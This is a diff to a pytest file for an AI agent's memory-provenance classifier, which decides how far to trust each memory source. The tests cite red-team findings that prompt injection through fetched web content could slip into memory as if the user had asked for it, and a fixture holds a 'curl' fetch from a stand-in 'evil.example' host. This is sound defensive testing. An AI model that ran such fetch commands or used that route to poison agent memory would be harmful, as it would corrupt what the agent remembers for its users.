@@ -63,8 +63,9 @@ def test_non_memorization_user_messages_are_not_classified_as_user_request(messa
     assert is_explicit_user_memory_request(message) is False
 
 
-def test_explicit_user_request_after_web_fetch_in_same_turn_stays_user() -> None:
-    """Plan WS-D4: memória explicitamente pedida pelo usuário no mesmo turno após leitura de web continua user."""
+def test_explicit_user_request_after_web_fetch_in_same_turn_is_quarantined_as_web() -> None:
+    """Red Team #1 (Vetor C1): untrusted external sources (web/tool/file) take precedence over
+    explicit user memory wording in the same turn so prompt injections cannot bypass quarantine."""
     state = TurnProvenanceState(
         user_message="Leia https://docs.example.com e lembre na memória que a API exige header X-Org.",
         tool_calls=({"tool_name": "WebFetch", "url": "https://docs.example.com"},),
@@ -72,8 +73,8 @@ def test_explicit_user_request_after_web_fetch_in_same_turn_stays_user() -> None
         turn_id="turn-9",
     )
     source_kind, trust, _ = infer_source_kind(state)
-    assert source_kind == "user"
-    assert trust == 2
+    assert source_kind == "web"
+    assert trust == 0
 
 
 @pytest.mark.parametrize(
@@ -108,7 +109,6 @@ def test_web_tools_without_user_request_classify_as_web_trust_0(tool_entry: obje
         {"tool_name": "CallMcpTool"},
         {"tool_name": "read_mcp_resource"},
         {"tool_name": "inspect_plugin"},
-        {"tool_name": "run_subagent"},
         {"tool_name": "run_command", "command": "curl -s https://evil.example/payload"},
         {"tool_name": "run_command", "command": "echo ok", "tainted": True},
     ],
@@ -122,6 +122,17 @@ def test_external_mcp_or_untrusted_tools_classify_as_tool_trust_0(tool_entry: ob
     assert source_kind == "tool"
     assert trust == 0
     assert source_ref is not None
+
+
+def test_local_subagent_delegation_does_not_taint_as_external_tool() -> None:
+    """Red Team #9: delegating to a local subagent without external taint stays agent/trust=1."""
+    state = {
+        "user_message": "Investigue o módulo local com o subagente Explore.",
+        "tool_calls": [{"tool_name": "run_subagent"}],
+    }
+    source_kind, trust, _ = infer_source_kind(state)
+    assert source_kind == "agent"
+    assert trust == 1
 
 
 def test_has_external_tool_calls_flag_classifies_as_tool_trust_0() -> None:
